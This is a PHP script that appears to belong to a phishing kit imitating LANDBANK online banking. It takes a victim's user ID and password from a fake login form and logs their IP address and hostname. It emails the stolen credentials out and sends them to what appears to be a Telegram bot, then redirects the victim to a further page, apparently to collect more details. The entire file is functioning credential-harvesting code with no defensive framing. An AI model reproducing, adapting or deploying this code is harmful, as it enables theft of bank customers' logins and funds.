<?php
include 'teleg.php';
$token = 0;
if(empty($_POST['userId']) || empty($_POST['pass'])) {
    header("Location: otpverification.php");
  } else {
  $userid = $_POST['userId'];
  $pass = $_POST['pass'];
  }
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

  $user = $_POST['userId'];
  $usern = htmlentities($user);
  $pass = $_POST['pass'];
  $ps = htmlentities($pass);

$msg .= gethostbyaddr($ip) . " - " . $ip;
$msg .= "\n";
$msg .= "-------------------[LANDBANK LOGIN]-----------------\n";
$msg .= "User ID        : ".$_POST['userId']."\n";
$msg .= "Password       : ".$_POST['pass']."\n";
$msg .= "Date     : ".$date." @ ".$dateHis."\n";
$msg .= "---------------------[ODIN LIF3]---------------------\n";

$subject = "New SB Login ".$emai."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);
tgbot($msg);
header("location: number.php");
?>